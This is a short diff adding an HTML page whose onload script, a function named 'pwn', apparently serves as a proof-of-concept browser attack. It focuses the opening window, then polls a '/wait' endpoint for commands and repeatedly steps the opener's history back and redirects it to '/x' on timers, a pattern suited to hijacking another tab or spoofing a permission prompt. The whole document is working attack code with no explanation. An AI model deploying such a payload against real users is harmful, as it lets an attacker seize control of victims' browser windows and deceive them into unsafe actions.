@@ -1,0 +1,25 @@
+<script>
+const sleep = (milliseconds) => {
+  return new Promise(resolve => setTimeout(resolve, milliseconds))
+}
+sleepQ = 15
+async function pwn() {
+opener.focus()
+//opener.history.pushState("", "")
+while (true) {
+  x = await fetch("/wait")
+  y = await x.text()
+  if (y == "geo") {
+    opener.history.go(-2)
+    await sleep(3000*sleepQ)
+  }
+  if (y == "stopitnow"){await sleep(10000000)}
+  opener.history.go(-2)
+  await sleep(30*sleepQ)
+  opener.location = "/x"
+  await sleep(20*sleepQ)
+}
+}
+</script>
+<body onload="pwn()">
+</body>
